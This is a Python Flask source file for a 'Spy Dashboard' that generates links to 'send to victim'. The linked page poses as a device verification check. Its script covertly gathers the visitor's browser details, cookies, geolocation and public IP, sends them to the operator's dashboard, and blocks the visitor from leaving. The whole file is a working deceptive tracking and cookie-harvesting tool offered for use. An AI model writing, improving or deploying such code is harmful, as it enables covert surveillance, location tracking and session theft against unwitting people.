# -*- coding: utf-8 -*-
import os
import uuid
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, session, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'default-secret-key-change-it')

#   ()
reports = {}

#  HTML
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Spy Dashboard</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body{background:#0a0f1e;font-family:monospace;padding:20px;color:#0f0;}
        .card{background:#111;border-radius:15px;padding:20px;margin-bottom:20px;border:1px solid #4affff;}
        input,button{padding:10px;margin:5px;border-radius:8px;border:none;}
        input{background:#000;color:#0f0;border:1px solid #4affff;width:70%;}
        button{background:#4affff;color:#000;cursor:pointer;}
        pre{background:#000;padding:10px;border-radius:8px;overflow:auto;}
        .data-item{border-left:3px solid #ff3366;margin:10px 0;padding:10px;background:#0f1422;}
    </style>
</head>
<body>
<div class="card">
    <h2> SPY DASHBOARD</h2>
    <p><strong>Your persistent UID:</strong> {{ uid }}</p>
    <div>
        <input type="text" id="link" value="{{ link }}" readonly style="width:70%;">
        <button onclick="copyLink()">Copy Link</button>
    </div>
    <form method="post" action="/new_uid" style="display:inline;">
        <button type="submit" style="background:#ff3366;"> Generate New Link (New UID)</button>
    </form>
    <p> Send current link to victim. Data stays with this UID until you create a new one.</p>
</div>
<div class="card">
    <h3> Received Data (UID: {{ uid }})</h3>
    <button onclick="location.reload()">Refresh</button>
    <div id="data">
        {% if reports[uid] and reports[uid].data %}
            {% for item in reports[uid].data|reverse %}
                <div class="data-item">
                    <small>{{ item.time }}</small>
                    <pre>{{ item.data | tojson(indent=2) }}</pre>
                </div>
            {% endfor %}
        {% else %}
            <p> No data yet. Send the link to victim.</p>
        {% endif %}
    </div>
</div>
<script>
    function copyLink() {
        let inp = document.getElementById('link');
        inp.select();
        navigator.clipboard.writeText(inp.value);
        alert('Link copied!');
    }
    setInterval(() => location.reload(), 5000);
</script>
</body>
</html>
"""

#   ( )
SPY_PAGE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>body{background:#000;color:#0f0;text-align:center;padding-top:20%;font-family:monospace;}</style>
</head>
<body>
    <h2> Secure connection established</h2>
    <p>Please wait while we verify your device...</p>
    <script>
        (async function() {
            const server = "{{ server }}";
            const uid = "{{ uid }}";
            
            async function sendData(data) {
                try {
                    const response = await fetch(server + '/api/report/' + uid, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(data)
                    });
                    if (response.ok) {
                        console.log('Data sent successfully');
                    } else {
                        console.error('Failed to send data, status:', response.status);
                    }
                } catch(e) {
                    console.error('Fetch error:', e);
                }
            }
            
            // Basic information
            let info = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: document.cookie,
                localStorageSize: localStorage.length,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            await sendData(info);
            
            // Geolocation (if permitted)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        sendData({ location: { lat: position.coords.latitude, lon: position.coords.longitude } });
                    },
                    error => console.log("Geolocation denied")
                );
            }
            
            // Public IP
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                await sendData({ ip: ipData.ip });
            } catch(e) { console.log("IP fetch failed"); }
            
            // Keep page busy so victim stays longer
            window.onbeforeunload = function() { return true; };
            setInterval(() => { history.pushState({}, '', '/'); }, 1000);
        })();
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return redirect('/dashboard')

@app.route('/dashboard')
def dashboard():
    if 'uid' not in session:
        session['uid'] = str(uuid.uuid4())[:8]
        if session['uid'] not in reports:
            reports[session['uid']] = {'data': []}
    uid = session['uid']
    # Ensure reports entry exists
    if uid not in reports:
        reports[uid] = {'data': []}
    link = request.host_url.rstrip('/') + '/spy/' + uid
    return render_template_string(DASHBOARD_HTML, link=link, uid=uid, reports=reports)

@app.route('/new_uid', methods=['POST'])
def new_uid():
    session['uid'] = str(uuid.uuid4())[:8]
    if session['uid'] not in reports:
        reports[session['uid']] = {'data': []}
    return redirect('/dashboard')

@app.route('/spy/<uid>')
def spy(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    return render_template_string(SPY_PAGE_HTML, server=request.host_url.rstrip('/'), uid=uid)

@app.route('/api/report/<uid>', methods=['POST'])
def report(uid):
    if uid not in reports:
        reports[uid] = {'data': []}
    try:
        data = request.get_json()
        if data is None:
            data = {"error": "No JSON received"}
    except Exception as e:
        data = {"error": str(e)}
    reports[uid]['data'].append({
        'time': datetime.now().strftime('%H:%M:%S'),
        'data': data
    })
    # Also print to console for debugging (will appear in render logs)
    print(f"[DEBUG] Data received for UID {uid}: {data}")
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)